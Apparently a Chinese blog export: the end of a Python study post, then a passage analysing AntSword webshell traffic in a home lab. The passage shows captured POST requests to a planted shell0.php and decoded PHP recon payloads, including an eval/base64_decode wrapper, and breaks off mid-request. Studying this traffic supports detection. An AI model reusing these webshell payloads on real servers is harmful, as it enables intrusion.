<h1 id="错误和异常"><a href="#错误和异常" class="headerlink" title="错误和异常"></a>错误和异常</h1><h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><p>try/except</p>
<p>异常捕捉可以使用 try/except 语句。</p>
<p>try 语句按照如下方式工作；</p>
<p>首先，执行 try 子句（在关键字 try 和关键字 except 之间的语句）。</p>
<p>如果没有异常发生，忽略 except 子句，try 子句执行后结束。</p>
<p>如果在执行 try 子句的过程中发生了异常，那么 try 子句余下的部分将被忽略。如果异常的类型和 except 之后的名称相符，那么对应的 except 子句将被执行。</p>
<p>如果一个异常没有与任何的 except 匹配，那么这个异常将会传递给上层的 try 中。</p>
<p>最后一个except子句可以忽略异常的名称，它将被当作通配符使用。你可以使用这种方法打印一个错误信息，然后再次把异常抛出。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;myfile.txt&#x27;</span>)</span><br><span class="line">    s = f.readline()</span><br><span class="line">    i = <span class="built_in">int</span>(s.strip())</span><br><span class="line"><span class="keyword">except</span> OSError <span class="keyword">as</span> err:</span><br><span class="line">    print(<span class="string">&quot;OS error: &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(err))</span><br><span class="line"><span class="keyword">except</span> ValueError:</span><br><span class="line">    print(<span class="string">&quot;Could not convert data to an integer.&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">&quot;Unexpected error:&quot;</span>, sys.exc_info()[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">raise</span></span><br></pre></td></tr></table></figure>
<p>try-finally 语句<br>try-finally 语句无论是否发生异常都将执行最后的代码。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    runoob()</span><br><span class="line"><span class="keyword">except</span> AssertionError <span class="keyword">as</span> error:</span><br><span class="line">    print(error)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;file.log&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            read_data = file.read()</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError <span class="keyword">as</span> fnf_error:</span><br><span class="line">        print(fnf_error)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    print(<span class="string">&#x27;这句话，无论异常是否发生都会执行。&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h1><h2 id="类定义"><a href="#类定义" class="headerlink" title="类定义"></a>类定义</h2><p>类有一个名为 <strong>init</strong>() 的特殊方法（构造方法），该方法在类实例化时会自动调用，像下面这样：</p>
<p> <strong>init</strong>() 方法可以有参数，参数通过 <strong>init</strong>() 传递到类的实例化操作上</p>
<pre><code>class Complex:
    def __init__(self, realpart, imagpart):
        self.r = realpart
        self.i = imagpart
x = Complex(3.0, -4.5)
</code></pre>
<p>self代表类的实例，而非类</p>
<p>类的方法与普通的函数只有一个特别的区别——它们必须有一个额外的第一个参数名称, 按照惯例它的名称是 self。</p>
<p>self 代表的是类的实例，代表当前对象的地址，而 self.class 则指向类。</p>
<h2 id="类对象"><a href="#类对象" class="headerlink" title="类对象"></a>类对象</h2><p>在类的内部，使用 def 关键字来定义一个方法，与一般函数定义不同，类方法必须包含参数 self, 且为第一个参数，self 代表的是类的实例。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">people</span>:</span></span><br><span class="line">    <span class="comment">#定义基本属性</span></span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    age = <span class="number">0</span></span><br><span class="line">    <span class="comment">#定义私有属性,私有属性在类外部无法直接进行访问</span></span><br><span class="line">    __weight = <span class="number">0</span></span><br><span class="line">    <span class="comment">#定义构造方法</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,n,a,w</span>):</span></span><br><span class="line">        self.name = n</span><br><span class="line">        self.age = a</span><br><span class="line">        self.__weight = w</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">speak</span>(<span class="params">self</span>):</span></span><br><span class="line">        print(<span class="string">&quot;%s 说: 我 %d 岁。&quot;</span> %(self.name,self.age))</span><br></pre></td></tr></table></figure>
<h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><pre><code>class DerivedClassName(BaseClassName):
    &lt;statement-1&gt;
    .
    .
    .
    &lt;statement-N&gt;
</code></pre>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#类定义</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">people</span>:</span></span><br><span class="line">    <span class="comment">#定义基本属性</span></span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    age = <span class="number">0</span></span><br><span class="line">    <span class="comment">#定义私有属性,私有属性在类外部无法直接进行访问</span></span><br><span class="line">    __weight = <span class="number">0</span></span><br><span class="line">    <span class="comment">#定义构造方法</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,n,a,w</span>):</span></span><br><span class="line">        self.name = n</span><br><span class="line">        self.age = a</span><br><span class="line">        self.__weight = w</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">speak</span>(<span class="params">self</span>):</span></span><br><span class="line">        print(<span class="string">&quot;%s 说: 我 %d 岁。&quot;</span> %(self.name,self.age))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#单继承示例</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">student</span>(<span class="params">people</span>):</span></span><br><span class="line">    grade = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,n,a,w,g</span>):</span></span><br><span class="line">        <span class="comment">#调用父类的构函</span></span><br><span class="line">        people.__init__(self,n,a,w)</span><br><span class="line">        self.grade = g</span><br><span class="line">    <span class="comment">#覆写父类的方法</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">speak</span>(<span class="params">self</span>):</span></span><br><span class="line">        print(<span class="string">&quot;%s 说: 我 %d 岁了，我在读 %d 年级&quot;</span>%(self.name,self.age,self.grade))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">s = student(<span class="string">&#x27;ken&#x27;</span>,<span class="number">10</span>,<span class="number">60</span>,<span class="number">3</span>)</span><br><span class="line">s.speak()</span><br></pre></td></tr></table></figure>

<h2 id="多继承"><a href="#多继承" class="headerlink" title="多继承"></a>多继承</h2><p>class DerivedClassName(Base1, Base2, Base3):</p>
<pre><code>&lt;statement-1&gt;
.
.
.
&lt;statement-N&gt;
</code></pre>
<p>需要注意圆括号中父类的顺序，若是父类中有相同的方法名，而在子类使用时未指定，python从左至右搜索 即方法在子类中未找到时，从左到右查找父类中是否包含方法。</p>
<h2 id="方法重写"><a href="#方法重写" class="headerlink" title="方法重写"></a>方法重写</h2><pre><code>class Parent:        # 定义父类
def myMethod(self):
    print (&#39;调用父类方法&#39;)

class Child(Parent): # 定义子类
def myMethod(self):
    print (&#39;调用子类方法&#39;)

c = Child()          # 子类实例
c.myMethod()         # 子类调用重写方法
super(Child,c).myMethod() #用子类对象调用父类已被覆盖的方法
</code></pre>
<p>super() 函数是用于调用父类(超类)的一个方法。</p>
<h2 id="类属性与方法"><a href="#类属性与方法" class="headerlink" title="类属性与方法"></a>类属性与方法</h2><p>__private_attrs：两个下划线开头，声明该属性为私有，不能在类的外部被使用或直接访问。在类内部的方法中使用时 self.__private_attrs。</p>
<p>在类的内部，使用 def 关键字来定义一个方法，与一般函数定义不同，类方法必须包含参数 self，且为第一个参数，self 代表的是类的实例。</p>
<p>self 的名字并不是规定死的，也可以使用 this，但是最好还是按照约定使用 self。</p>
<p>__private_method：两个下划线开头，声明该方法为私有方法，只能在类的内部调用 ，不能在类的外部调用。self.__private_methods。</p>
<p>类的专有方法：</p>
<pre><code>__init__ : 构造函数，在生成对象时调用
__del__ : 析构函数，释放对象时使用
__repr__ : 打印，转换
__setitem__ : 按照索引赋值
__getitem__: 按照索引获取值
__len__: 获得长度
__cmp__: 比较运算
__call__: 函数调用
__add__: 加运算
__sub__: 减运算
__mul__: 乘运算
__truediv__: 除运算
__mod__: 求余运算
__pow__: 乘方
</code></pre>
<p>Python同样支持运算符重载，我们可以对类的专有方法进行重载</p>
<pre><code>def __str__(self):
    return &#39;Vector (%d, %d)&#39; % (self.a, self.b)
</code></pre>
<h1 id="命名空间和作用域"><a href="#命名空间和作用域" class="headerlink" title="命名空间和作用域"></a>命名空间和作用域</h1><h2 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h2><blockquote>
<p>命名空间，没系统接触过，只知道个using namespace std，之前php上面见过不少</p>
</blockquote>
<p>命名空间(Namespace)是从名称到对象的映射，大部分的命名空间都是通过 Python 字典来实现的。</p>
<p>命名空间提供了在项目中避免名字冲突的一种方法。各个命名空间是独立的，没有任何关系的，所以一个命名空间中不能有重名，但不同的命名空间是可以重名而没有任何影响。</p>
<p>我们举一个计算机系统中的例子，一个文件夹(目录)中可以包含多个文件夹，每个文件夹中不能有相同的文件名，但不同文件夹中的文件可以重名。</p>
<p>一般有三种命名空间：</p>
<p>内置名称（built-in names）， Python 语言内置的名称，比如函数名 abs、char 和异常名称 BaseException、Exception 等等。</p>
<p>全局名称（global names），模块中定义的名称，记录了模块的变量，包括函数、类、其它导入的模块、模块级的变量和常量。</p>
<p>局部名称（local names），函数中定义的名称，记录了函数的变量，包括函数的参数和局部定义的变量。（类中定义的也是）</p>
<p>局部的命名空间去 -&gt; 全局命名空间 -&gt; 内置命名空间</p>
<p>命名空间的生命周期取决于对象的作用域，如果对象执行完成，则该命名空间的生命周期就结束。因此，我们无法从外部命名空间访问内部命名空间的对象。</p>
<h2 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h2><p>有四种作用域：</p>
<ul>
<li>L（Local）：最内层，包含局部变量，比如一个函数/方法内部。</li>
<li>E（Enclosing）：包含了非局部(non-local)也非全局(non-global)的变量。比如两个嵌套函数，一个函数（或类） A 里面又包含了一个函数 B ，那么对于 B 中的名称来说 A 中的作用域就为 nonlocal。</li>
<li>G（Global）：当前脚本的最外层，比如当前模块的全局变量。</li>
<li>B（Built-in）： 包含了内建的变量/关键字等，最后被搜索。</li>
</ul>
<p>规则顺序： L –&gt; E –&gt; G –&gt; B。</p>
<p>当内部作用域想修改外部作用域的变量时，就要用到 global 和 nonlocal 关键字了。</p>
<pre><code>num = 1
def fun1():
    global num  # 需要使用 global 关键字声明
    print(num) 
    num = 123
    print(num)
fun1()
print(num)
</code></pre>
<p>如果要修改嵌套作用域（enclosing 作用域，外层非全局作用域）中的变量则需要 nonlocal 关键字了，如下实例：</p>
<pre><code>def outer():
    num = 10
    def inner():
        nonlocal num   # nonlocal关键字声明
        num = 100
        print(num)
    inner()
    print(num)
outer()
</code></pre>
<h1 id="标准库"><a href="#标准库" class="headerlink" title="标准库"></a>标准库</h1><blockquote>
<p>写的有点简单，没深入</p>
</blockquote>
<h2 id="操作系统接口"><a href="#操作系统接口" class="headerlink" title="操作系统接口"></a>操作系统接口</h2><p>os.system(‘mkdir today’)   # 执行系统命令 mkdir</p>
<p>建议使用 “import os” 风格而非 “from os import *”。这样可以保证随操作系统不同而有所变化的 os.open() 不会覆盖内置函数 open()。</p>
<p>针对日常的文件和目录管理任务，:mod:shutil 模块提供了一个易于使用的高级接口:</p>
<pre><code>&gt;&gt;&gt; shutil.copyfile(&#39;data.db&#39;, &#39;archive.db&#39;)
&gt;&gt;&gt; shutil.move(&#39;/build/executables&#39;, &#39;installdir&#39;)
</code></pre>
<h2 id="文件通配符"><a href="#文件通配符" class="headerlink" title="文件通配符"></a>文件通配符</h2><pre><code>&gt;&gt;&gt; import glob
&gt;&gt;&gt; glob.glob(&#39;*.py&#39;)
[&#39;primes.py&#39;, &#39;random.py&#39;, &#39;quote.py&#39;]
</code></pre>
<h2 id="命令行参数"><a href="#命令行参数" class="headerlink" title="命令行参数"></a>命令行参数</h2><p>通用工具脚本经常调用命令行参数。这些命令行参数以链表形式存储于 sys 模块的 argv 变量。</p>
<h2 id="错误输出重定向和程序终止"><a href="#错误输出重定向和程序终止" class="headerlink" title="错误输出重定向和程序终止"></a>错误输出重定向和程序终止</h2><p>sys 还有 stdin，stdout 和 stderr 属性，即使在 stdout 被重定向时，后者也可以用于显示警告和错误信息。</p>
<h2 id="字符串正则匹配"><a href="#字符串正则匹配" class="headerlink" title="字符串正则匹配"></a>字符串正则匹配</h2><p>re模块为高级字符串处理提供了正则表达式工具。对于复杂的匹配和处理，正则表达式提供了简洁、优化的解决方案:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.findall(<span class="string">r&#x27;\bf[a-z]*&#x27;</span>, <span class="string">&#x27;which foot or hand fell fastest&#x27;</span>)</span><br><span class="line">[<span class="string">&#x27;foot&#x27;</span>, <span class="string">&#x27;fell&#x27;</span>, <span class="string">&#x27;fastest&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.sub(<span class="string">r&#x27;(\b[a-z]+) \1&#x27;</span>, <span class="string">r&#x27;\1&#x27;</span>, <span class="string">&#x27;cat in the the hat&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;cat in the hat&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="math"><a href="#math" class="headerlink" title="math"></a>math</h2><p>math模块为浮点运算提供了对底层C函数库的访问:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> math</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>math.cos(math.pi / <span class="number">4</span>)</span><br><span class="line"><span class="number">0.70710678118654757</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>math.log(<span class="number">1024</span>, <span class="number">2</span>)</span><br><span class="line"><span class="number">10.0</span></span><br></pre></td></tr></table></figure>

<h2 id="访问互联网"><a href="#访问互联网" class="headerlink" title="访问互联网"></a>访问互联网</h2><p>有几个模块用于访问互联网以及处理网络通信协议。其中最简单的两个是用于处理从 urls 接收的数据的 urllib.request 以及用于发送电子邮件的 smtplib</p>
<h2 id="日期和时间"><a href="#日期和时间" class="headerlink" title="日期和时间"></a>日期和时间</h2><p>datetime模块为日期和时间处理同时提供了简单和复杂的方法。</p>
<p>支持日期和时间算法的同时，实现的重点放在更有效的处理和格式化输出。</p>
<h2 id="数据压缩"><a href="#数据压缩" class="headerlink" title="数据压缩"></a>数据压缩</h2><p>zlib gzip bz2 zipfile tarfile</p>
<pre><code>&gt;&gt;&gt; import zlib
&gt;&gt;&gt; s = b&#39;witch which has which witches wrist watch&#39;
&gt;&gt;&gt; len(s)
41
&gt;&gt;&gt; t = zlib.compress(s)
&gt;&gt;&gt; len(t)
37
&gt;&gt;&gt; zlib.decompress(t)
b&#39;witch which has which witches wrist watch&#39;
&gt;&gt;&gt; zlib.crc32(s)
226805979
</code></pre>
<h2 id="性能度量"><a href="#性能度量" class="headerlink" title="性能度量"></a>性能度量</h2><p>相对于 timeit 的细粒度，:mod:profile 和 pstats 模块提供了针对更大代码块的时间度量工具。</p>
<h1 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h1><p>就是个有手就行的语言，用了不到10个小时</p>
<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210823194709.png"></p>
]]></content>
      <categories>
        <category>python学习</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>蚁剑流量分析</title>
    <url>/posts/367c8d9/</url>
    <content><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>靶机为一台运行kali的虚拟机，提前写了一句话</p>
<span id="more"></span>
<h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><h3 id="测试连接"><a href="#测试连接" class="headerlink" title="测试连接"></a>测试连接</h3><p>先用default编码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;shell0.php HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.217.128:100</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: antSword&#x2F;v2.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 993</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">cmd&#x3D;%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3Bfunction%20asenc(%24out)%7Breturn%20%24out%3B%7D%3Bfunction%20asoutput()%7B%24output%3Dob_get_contents()%3Bob_end_clean()%3Becho%20%224eba6e362469%22%3Becho%20%40asenc(%24output)%3Becho%20%22b1c628%22%3B%7Dob_start()%3Btry%7B%24D%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3Bif(%24D%3D%3D%22%22)%24D%3Ddirname(%24_SERVER%5B%22PATH_TRANSLATED%22%5D)%3B%24R%3D%22%7B%24D%7D%09%22%3Bif(substr(%24D%2C0%2C1)!%3D%22%2F%22)%7Bforeach(range(%22C%22%2C%22Z%22)as%20%24L)if(is_dir(%22%7B%24L%7D%3A%22))%24R.%3D%22%7B%24L%7D%3A%22%3B%7Delse%7B%24R.%3D%22%2F%22%3B%7D%24R.%3D%22%09%22%3B%24u%3D(function_exists(%22posix_getegid%22))%3F%40posix_getpwuid(%40posix_geteuid())%3A%22%22%3B%24s%3D(%24u)%3F%24u%5B%22name%22%5D%3A%40get_current_user()%3B%24R.%3Dphp_uname()%3B%24R.%3D%22%09%7B%24s%7D%22%3Becho%20%24R%3B%3B%7Dcatch(Exception%20%24e)%7Becho%20%22ERROR%3A%2F%2F%22.%24e-%3EgetMessage()%3B%7D%3Basoutput()%3Bdie()%3B</span><br></pre></td></tr></table></figure>

<p>可以看到，User-Agent很明显看出是蚁剑</p>
<p>url解码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cmd=</span><br><span class="line">@ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>)</span>&#123;<span class="keyword">return</span> <span class="variable">$out</span>;&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$output</span>=ob_get_contents();<span class="comment">#获取缓存区内容</span></span><br><span class="line">    ob_end_clean();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;4eba6e362469&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> @asenc(<span class="variable">$output</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;b1c628&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();<span class="comment"># 打开输出控制缓冲，将需要输出的内容存储在内部缓冲区中，R输出到缓存区</span></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable">$D</span>=dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]); <span class="comment">#获取脚本执行路径</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$D</span>==<span class="string">&quot;&quot;</span>) <span class="variable">$D</span>=dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;PATH_TRANSLATED&quot;</span>]);<span class="comment">#获取文档系统路径</span></span><br><span class="line">    <span class="variable">$R</span>=<span class="string">&quot;<span class="subst">&#123;$D&#125;</span>	&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(substr(<span class="variable">$D</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="string">&quot;/&quot;</span>)&#123;<span class="comment">#判断是否为windows系统以及盘符，linux都是/开始</span></span><br><span class="line">        <span class="keyword">foreach</span>(range(<span class="string">&quot;C&quot;</span>,<span class="string">&quot;Z&quot;</span>)<span class="keyword">as</span> <span class="variable">$L</span>)</span><br><span class="line">            <span class="keyword">if</span>(is_dir(<span class="string">&quot;<span class="subst">&#123;$L&#125;</span>:&quot;</span>))<span class="variable">$R</span>.=<span class="string">&quot;<span class="subst">&#123;$L&#125;</span>:&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$R</span>.=<span class="string">&quot;/&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$R</span>.=<span class="string">&quot;	&quot;</span>;</span><br><span class="line">    <span class="variable">$u</span>=(function_exists(<span class="string">&quot;posix_getegid&quot;</span>))?@posix_getpwuid(@posix_geteuid()):<span class="string">&quot;&quot;</span>;	</span><br><span class="line">    <span class="comment">#posix_getpwuid通过用户ID返回有关用户的信息 </span></span><br><span class="line">    <span class="comment">#posix_geteuid返回当前进程的有效用户ID </span></span><br><span class="line">    <span class="variable">$s</span>=(<span class="variable">$u</span>)?<span class="variable">$u</span>[<span class="string">&quot;name&quot;</span>]:@get_current_user();<span class="comment">#获取用户名</span></span><br><span class="line">    <span class="variable">$R</span>.=php_uname();</span><br><span class="line">    <span class="variable">$R</span>.=<span class="string">&quot;	<span class="subst">&#123;$s&#125;</span>&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$R</span>;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">&#125;;</span><br><span class="line">asoutput();</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure>

<p>其中cmd是密码，后面的是要执行的php命令</p>
<p>成功返回服务器信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;var&#x2F;www&#x2F;html	&#x2F;	Linux e8088063b385 5.10.0-kali3-amd64 #1 SMP Debian 5.10.13-1kali1 (2021-02-08) x86_64	www-data</span><br></pre></td></tr></table></figure>

<p>换成base64编码测试，解码器也换成base64,报文如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;shell0.php HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.217.128:100</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: antSword&#x2F;v2.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 970</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">cmd&#x3D;%40eval(%40base64_decode(%24_POST%5Bo2bd4cb489ef4a%5D))%3B&amp;o2bd4cb489ef4a&#x3D;QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuIEBiYXNlNjRfZW5jb2RlKCRvdXQpO307ZnVuY3Rpb24gYXNvdXRwdXQoKXskb3V0cHV0PW9iX2dldF9jb250ZW50cygpO29iX2VuZF9jbGVhbigpO2VjaG8gIjlmNGNlZWYiO2VjaG8gQGFzZW5jKCRvdXRwdXQpO2VjaG8gIjJjOWFmNGVkODkzIjt9b2Jfc3RhcnQoKTt0cnl7JEQ9ZGlybmFtZSgkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl0pO2lmKCREPT0iIikkRD1kaXJuYW1lKCRfU0VSVkVSWyJQQVRIX1RSQU5TTEFURUQiXSk7JFI9InskRH0JIjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJDIiwiWiIpYXMgJEwpaWYoaXNfZGlyKCJ7JEx9OiIpKSRSLj0ieyRMfToiO31lbHNleyRSLj0iLyI7fSRSLj0iCSI7JHU9KGZ1bmN0aW9uX2V4aXN0cygicG9zaXhfZ2V0ZWdpZCIpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6IiI7JHM9KCR1KT8kdVsibmFtZSJdOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iCXskc30iO2VjaG8gJFI7O31jYXRjaChFeGNlcHRpb24gJGUpe2VjaG8gIkVSUk9SOi8vIi4kZS0%2BZ2V0TWVzc2FnZSgpO307YXNvdXRwdXQoKTtkaWUoKTs%3D</span><br></pre></td></tr></table></figure>
<p>url解码，base64解码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cmd=@<span class="keyword">eval</span>(@base64_decode(<span class="variable">$_POST</span>[o2bd4cb489ef4a]));</span><br><span class="line">o2bd4cb489ef4a=</span><br><span class="line">@ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);@set_time_limit(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> @base64_encode(<span class="variable">$out</span>);</span><br><span class="line">    <span class="comment">#只有这一处不同，会将返回的数据提前进行base64加密</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span>&#123;<span class="variable">$output</span>=ob_get_contents();ob_end_clean();<span class="keyword">echo</span> <span class="string">&quot;9f4ceef&quot;</span>;<span class="keyword">echo</span> @asenc(<span class="variable">$output</span>);<span class="keyword">echo</span> <span class="string">&quot;2c9af4ed893&quot;</span>;&#125;ob_start();<span class="keyword">try</span>&#123;<span class="variable">$D</span>=dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);<span class="keyword">if</span>(<span class="variable">$D</span>==<span class="string">&quot;&quot;</span>)<span class="variable">$D</span>=dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;PATH_TRANSLATED&quot;</span>]);<span class="variable">$R</span>=<span class="string">&quot;<span class="subst">&#123;$D&#125;</span>	&quot;</span>;<span class="keyword">if</span>(substr(<span class="variable">$D</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="string">&quot;/&quot;</span>)&#123;<span class="keyword">foreach</span>(range(<span class="string">&quot;C&quot;</span>,<span class="string">&quot;Z&quot;</span>)<span class="keyword">as</span> <span class="variable">$L</span>)<span class="keyword">if</span>(is_dir(<span class="string">&quot;<span class="subst">&#123;$L&#125;</span>:&quot;</span>))<span class="variable">$R</span>.=<span class="string">&quot;<span class="subst">&#123;$L&#125;</span>:&quot;</span>;&#125;<span class="keyword">else</span>&#123;<span class="variable">$R</span>.=<span class="string">&quot;/&quot;</span>;&#125;<span class="variable">$R</span>.=<span class="string">&quot;	&quot;</span>;<span class="variable">$u</span>=(function_exists(<span class="string">&quot;posix_getegid&quot;</span>))?@posix_getpwuid(@posix_geteuid()):<span class="string">&quot;&quot;</span>;<span class="variable">$s</span>=(<span class="variable">$u</span>)?<span class="variable">$u</span>[<span class="string">&quot;name&quot;</span>]:@get_current_user();<span class="variable">$R</span>.=php_uname();<span class="variable">$R</span>.=<span class="string">&quot;	<span class="subst">&#123;$s&#125;</span>&quot;</span>;<span class="keyword">echo</span> <span class="variable">$R</span>;;&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;<span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;getMessage();&#125;;asoutput();<span class="keyword">die</span>();</span><br></pre></td></tr></table></figure>

<p>相当于是eval执行了个eval post里面是真正的命令，代码基本没差别</p>
<p>然后测试chr</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;shell0.php HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.217.128:100</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: antSword&#x2F;v2.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 5473</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span 